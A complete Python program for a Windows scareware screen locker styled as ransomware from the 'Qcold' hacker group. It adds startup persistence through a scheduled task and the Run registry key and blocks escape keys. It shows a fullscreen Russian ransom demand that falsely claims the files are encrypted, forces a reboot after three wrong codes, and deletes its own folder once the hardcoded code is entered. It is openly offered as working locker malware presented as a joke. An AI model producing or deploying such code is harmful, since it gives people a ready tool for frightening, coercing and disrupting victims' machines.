# -*- coding: utf-8 -*-
import sys, os, base64, tempfile, time, random, string, shutil
import subprocess, ctypes
import tkinter as tk

try:
    import keyboard
except ImportError:
    sys.exit(1)

try:
    import winsound
    HAS_SOUND = True
except ImportError:
    HAS_SOUND = False

try:
    import winreg
    HAS_REG = True
except ImportError:
    HAS_REG = False

PASSWORD = "123"
MAX_ATTEMPTS = 3
BLOCKED = ["left windows", "right windows", "alt+tab", "alt+f4",
           "ctrl+esc", "alt+esc", "ctrl+shift+esc"]

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

ERROR_LOG = os.path.join(SCRIPT_DIR, "error.log")

START_B64   = os.path.join(SCRIPT_DIR, "start.b64")
SOUND_B64   = os.path.join(SCRIPT_DIR, "sound.b64")
VOICE_B64   = os.path.join(SCRIPT_DIR, "voice.b64")
CORRECT_B64 = os.path.join(SCRIPT_DIR, "correct.b64")
WRONG_B64   = os.path.join(SCRIPT_DIR, "wrong.b64")

START_WAV   = os.path.join(SCRIPT_DIR, "start.wav")
SOUND_WAV   = os.path.join(SCRIPT_DIR, "sound.wav")
VOICE_WAV   = os.path.join(SCRIPT_DIR, "voice.wav")
CORRECT_WAV = os.path.join(SCRIPT_DIR, "correct.wav")
WRONG_WAV   = os.path.join(SCRIPT_DIR, "wrong.wav")

_TEMP_START   = os.path.join(tempfile.gettempdir(), "cyberhack_start.wav")
_TEMP_SOUND   = os.path.join(tempfile.gettempdir(), "cyberhack_sound.wav")
_TEMP_VOICE   = os.path.join(tempfile.gettempdir(), "cyberhack_voice.wav")
_TEMP_CORRECT = os.path.join(tempfile.gettempdir(), "cyberhack_correct.wav")
_TEMP_WRONG   = os.path.join(tempfile.gettempdir(), "cyberhack_wrong.wav")

DIR_SCAN_DURATION_MS = 6000
DIR_SCAN_LINE_MS     = 1

APP_NAME  = "CyberHack"
RUN_KEY   = r"Software\Microsoft\Windows\CurrentVersion\Run"
TASK_NAME = "CyberHackLocker"
MUTEX     = "Global\\CyberHackJokeMutex"

FAKE_EXTENSIONS = [".txt", ".docx", ".jpg", ".png", ".mp4", ".exe", ".dll",
                   ".ini", ".log", ".cfg", ".pdf", ".zip", ".py", ".json"]


# ----------------------------- АВТОЗАПУСК -----------------------------

def _pyw_path():
    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    return pyw if os.path.exists(pyw) else sys.executable


def install_autostart():
    """Планировщик + HKCU Run, напрямую pythonw.exe, без cmd."""
    pyw = _pyw_path()
    script = os.path.abspath(__file__)
    tr = f'"{pyw}" "{script}"'

    # 1) Планировщик: /it (в сессии юзера), /delay 10 с, скрытое окно
    try:
        subprocess.run(
            ["schtasks", "/create", "/tn", TASK_NAME,
             "/tr", tr, "/sc", "onlogon",
             "/delay", "0000:10", "/rl", "highest", "/it", "/f"],
            capture_output=True, creationflags=0x08000000,
        )
    except Exception:
        pass

    # 2) HKCU Run (fallback)
    if HAS_REG:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                                winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, APP_NAME, 0, winreg.REG_SZ, tr)
        except Exception:
            pass


def remove_autostart():
    if HAS_REG:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                                winreg.KEY_SET_VALUE) as k:
                winreg.DeleteValue(k, APP_NAME)
        except Exception:
            pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", TASK_NAME, "/f"],
                       capture_output=True, creationflags=0x08000000)
    except Exception:
        pass


def already_running():
    try:
        ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX)
        return ctypes.windll.kernel32.GetLastError() == 183
    except Exception:
        return False


# ----------------------------- ЗВУК -----------------------------

def _load_b64_file(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f
                     if ln.strip() and "CERTIFICATE" not in ln]
        return "".join(lines)
    except Exception:
        return None


def _decode_b64_to_wav(src, dst):
    if os.path.exists(dst):
        return dst
    if not os.path.exists(src):
        return None
    b64 = _load_b64_file(src)
    if not b64:
        return None
    try:
        data = base64.b64decode(b64, validate=False)
    except Exception:
        return None
    if not data or len(data) < 12:
        return None
    if data[:4] != b"RIFF" or data[8:12] != b"WAVE":
        return None
    try:
        with open(dst, "wb") as f:
            f.write(data)
        return dst
    except Exception:
        return None


def prepare_start():    return START_WAV if os.path.exists(START_WAV)   else _decode_b64_to_wav(START_B64,   _TEMP_START)
def prepare_sound():    return SOUND_WAV if os.path.exists(SOUND_WAV)   else _decode_b64_to_wav(SOUND_B64,   _TEMP_SOUND)
def prepare_voice():    return VOICE_WAV if os.path.exists(VOICE_WAV)   else _decode_b64_to_wav(VOICE_B64,   _TEMP_VOICE)
def prepare_correct():  return CORRECT_WAV if os.path.exists(CORRECT_WAV) else _decode_b64_to_wav(CORRECT_B64, _TEMP_CORRECT)
def prepare_wrong():    return WRONG_WAV if os.path.exists(WRONG_WAV)   else _decode_b64_to_wav(WRONG_B64,   _TEMP_WRONG)


def _play(path):
    if not HAS_SOUND or not path:
        return
    try:
        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
    except Exception:
        pass


def play_start():   _play(prepare_start())
def play_sound():   _play(prepare_sound())
def play_voice():   _play(prepare_voice())
def play_correct(): _play(prepare_correct())
def play_wrong():   _play(prepare_wrong())


def stop_all_sounds():
    if HAS_SOUND:
        try:
            winsound.PlaySound(None, winsound.SND_PURGE)
        except Exception:
            pass


def sound_reboot_tick():
    if HAS_SOUND:
        try:
            winsound.Beep(900, 20)
        except Exception:
            pass


# ----------------------------- КЛАВИШИ -----------------------------

def block_keys():
    for k in BLOCKED:
        try:
            keyboard.block_key(k)
        except Exception:
            pass


def unblock_keys():
    for k in BLOCKED:
        try:
            keyboard.unblock_key(k)
        except Exception:
            pass
    try:
        keyboard.unhook_all_hotkeys()
    except Exception:
        pass


# ----------------------------- ОЧИСТКА -----------------------------

def _remove_self_file(path):
    try:
        if os.path.exists(path):
            subprocess.Popen(
                ["cmd", "/c", "del", "/f", "/q", path],
                shell=False, creationflags=0x08000000,
            )
    except Exception:
        pass


def cleanup_all():
    stop_all_sounds()
    unblock_keys()
    remove_autostart()

    for f in (START_B64, SOUND_B64, VOICE_B64, CORRECT_B64, WRONG_B64,
              START_WAV, SOUND_WAV, VOICE_WAV, CORRECT_WAV, WRONG_WAV):
        try:
            os.remove(f)
        except Exception:
            pass

    for f in (_TEMP_START, _TEMP_SOUND, _TEMP_VOICE, _TEMP_CORRECT, _TEMP_WRONG):
        try:
            os.remove(f)
        except Exception:
            pass

    try:
        os.remove(os.path.join(SCRIPT_DIR, "key.txt"))
    except Exception:
        pass

    try:
        startup = os.path.join(
            os.environ.get("APPDATA", ""),
            r"Microsoft\Windows\Start Menu\Programs\Startup\cyberhack_check.bat",
        )
        if os.path.exists(startup):
            _remove_self_file(startup)
    except Exception:
        pass

    _remove_self_file(os.path.abspath(__file__))

    try:
        shutil.rmtree(SCRIPT_DIR, ignore_errors=True)
    except Exception:
        pass


# ----------------------------- dir /s -----------------------------

def random_filename():
    n = random.randint(190, 200)
    name = "".join(random.choices(string.ascii_letters + string.digits, k=n))
    return name + random.choice(FAKE_EXTENSIONS)


def random_size():
    return f"{random.randint(1, 999_999):,}".replace(",", " ")


def fake_dir_line():
    date = f"{random.randint(1,28):02d}.{random.randint(1,12):02d}.{random.randint(2018,2025)}"
    tm   = f"{random.randint(0,23):02d}:{random.randint(0,59):02d}"
    return f"{date}  {tm}    {random_size():>12} {random_filename()}"


# ----------------------------- ASCII -----------------------------

ASCII_CYBERHACK = r"""
  ██████╗██╗   ██╗██████╗ ███████╗██████╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
 ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
 ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
 ╚██████╗   ██║   ██████╔╝███████╗██║  ██║
  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝

  ██╗  ██╗ █████╗  ██████╗██╗  ██╗
  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
  ███████║███████║██║     █████╔╝
  ██╔══██║██╔══██║██║     ██╔═██╗
  ██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

        ☠  YOUR FILES ARE ENCRYPTED  ☠
         BY HACKER GROUP  Q C O L D
"""


# ----------------------------- ОКНО -----------------------------

class Locker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.overrideredirect(True)
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        self.attempts   = 0
        self.stop_flag  = False
        self.sector     = 0
        self._pwd_shown = False

        self.blank = tk.Frame(self.root, bg="black")
        self.blank.pack(fill=tk.BOTH, expand=True)
        play_start()

        self.root.after(1000, self._show_red)
        self.root.after(3000, self._start_dir_scan)
        self.root.after(9000, self._show_password_ui)

    def _show_red(self):
        if self._pwd_shown: return
        for w in self.root.winfo_children(): w.destroy()
        self.red = tk.Frame(self.root, bg="#7a0000")
        self.red.pack(fill=tk.BOTH, expand=True)
        play_sound()

    def _start_dir_scan(self):
        if self._pwd_shown: return
        for w in self.root.winfo_children(): w.destroy()
        play_voice()

        self.text_widget = tk.Text(
            self.root, bg="black", fg="#ff0000",
            font=("Consolas", 9),
            borderwidth=0, highlightthickness=0,
            insertbackground="#ff0000", wrap="none",
        )
        self.text_widget.pack(fill="both", expand=True)
        self.text_widget.config(state="disabled")

        self._scan_elapsed = 0
        self._append_line("C:\\Users\\User>dir /s")
        self._append_line("")
        self.root.after(100, self._scan_tick)

    def _append_line(self, line):
        try:
            self.text_widget.config(state="normal")
            self.text_widget.insert("end", line + "\n")
            self.text_widget.see("end")
            self.text_widget.config(state="disabled")
        except tk.TclError:
            pass

    def _scan_tick(self):
        if self._pwd_shown: return
        if self._scan_elapsed >= DIR_SCAN_DURATION_MS: return
        self._append_line(fake_dir_line())
        self._scan_elapsed += DIR_SCAN_LINE_MS
        self.root.after(DIR_SCAN_LINE_MS, self._scan_tick)

    def _show_password_ui(self):
        if self._pwd_shown: return
        self._pwd_shown = True

        for w in self.root.winfo_children(): w.destroy()
        self.root.configure(bg="black")

        self.text = tk.Text(
            self.root, bg="black", fg="#ff3333",
            font=("Consolas", 14), bd=0, highlightthickness=0,
        )
        self.text.pack(fill=tk.BOTH, expand=True)

        self.text.insert(tk.END, ASCII_CYBERHACK + "\n")
        self.text.insert(tk.END, "Привет дружище.\n")
        self.text.insert(tk.END, "Твои данные были зашифрованы\n")
        self.text.insert(tk.END, "хакерской группировкой Qcold.\n\n")
        self.text.insert(tk.END, "Все твои файлы, фотографии, документы\n")
        self.text.insert(tk.END, "и твой писюн у нас.\n\n")
        self.text.insert(tk.END, "Мы не шутим — если хочешь вернуть, плати.\n")
        self.text.insert(tk.END, "Три неверных пароля — и твой компьютер\n")
        self.text.insert(tk.END, "уйдёт в 200.\n\n")
        self.text.insert(tk.END, "Введи код или твой комп сдохнет:\n")
        self.text.configure(state="disabled")

        self.entry = tk.Entry(
            self.root, bg="black", fg="lime",
            font=("Consolas", 16), insertbackground="lime",
            bd=0, highlightthickness=0,
        )
        self.entry.pack(fill=tk.X, padx=40, pady=10)
        self.entry.focus_force()

        self.progress_label = tk.Label(
            self.root, bg="black", fg="#ff3333",
            font=("Consolas", 12), anchor="w",
        )
        self.progress_label.pack(fill=tk.X, padx=40, pady=5)

        self.entry.bind("<Return>", self.check_password)
        self._tick_sector()

    def _tick_sector(self):
        if self.stop_flag: return
        self.sector += 1
        try:
            self.progress_label.config(text=f"Encrypting sector {self.sector}...")
        except tk.TclError:
            return
        self.root.after(100, self._tick_sector)

    def check_password(self, event=None):
        pwd = self.entry.get().strip()
        self.entry.delete(0, tk.END)

        if not pwd.isdigit():
            play_wrong()
            self.text.configure(state="normal")
            self.text.insert(tk.END, "\nТолько цифры.\n")
            self.text.see(tk.END)
            self.text.configure(state="disabled")
            return

        if pwd == PASSWORD:
            self.stop_flag = True
            stop_all_sounds()
            play_correct()
            self.text.configure(state="normal")
            self.text.insert(tk.END, "\n\nДОСТУП РАЗРЕШЁН. ЭТО БЫЛА ШУТКА.\n")
            self.text.see(tk.END)
            self.text.configure(state="disabled")
            unblock_keys()
            self.root.after(1500, self._finish_and_cleanup)
            return

        self.attempts += 1
        left = MAX_ATTEMPTS - self.attempts

        if self.attempts >= MAX_ATTEMPTS:
            self.stop_flag = True
            stop_all_sounds()
            unblock_keys()
            self.real_reboot()
            return

        play_wrong()
        self.text.configure(state="normal")
        self.text.insert(tk.END, f"\nНеверный код. Осталось попыток: {left}\n")
        self.text.see(tk.END)
        self.text.configure(state="disabled")

    def real_reboot(self):
        self.progress_label.config(text="▓▓▓  SYSTEM IS REBOOTING...  ▓▓▓")
        self.text.configure(state="normal")

        self.text.insert(tk.END, "\n")
        bar_line = int(self.text.index(tk.END).split(".")[0])
        self.text.insert(tk.END, "[" + "-" * 40 + "]   0%\n")
        self.text.see(tk.END)
        self.root.update()

        for i in range(1, 101):
            time.sleep(0.05)
            sound_reboot_tick()
            bar = "#" * (i * 40 // 100) + "-" * (40 - i * 40 // 100)
            self.text.delete(f"{bar_line}.0", f"{bar_line}.end")
            self.text.insert(f"{bar_line}.0", f"[{bar}] {i:3d}%")
            self.text.see(tk.END)
            self.root.update()

        self.text.insert(tk.END, "\n\nSYSTEM IS REBOOTING...\n")
        self.text.see(tk.END)
        self.root.update()

        os.system("shutdown /r /t 0")

    def _finish_and_cleanup(self):
        try:
            self.root.destroy()
        except Exception:
            pass
        cleanup_all()
        os._exit(0)

    def run(self):
        block_keys()
        self.root.mainloop()


# ----------------------------- MAIN -----------------------------

def _log_crash():
    import traceback
    try:
        with open(ERROR_LOG, "w", encoding="utf-8") as f:
            f.write(traceback.format_exc())
    except Exception:
        pass


if __name__ == "__main__":
    if "--install" in sys.argv:
        install_autostart()
        sys.exit(0)

    if already_running():
        sys.exit(0)

    try:
        Locker().run()
    except KeyboardInterrupt:
        unblock_keys()
        stop_all_sounds()
        cleanup_all()
        sys.exit(0)
    except Exception:
        _log_crash()
        cleanup_all()
        raise
    finally:
        unblock_keys()
        stop_all_sounds()
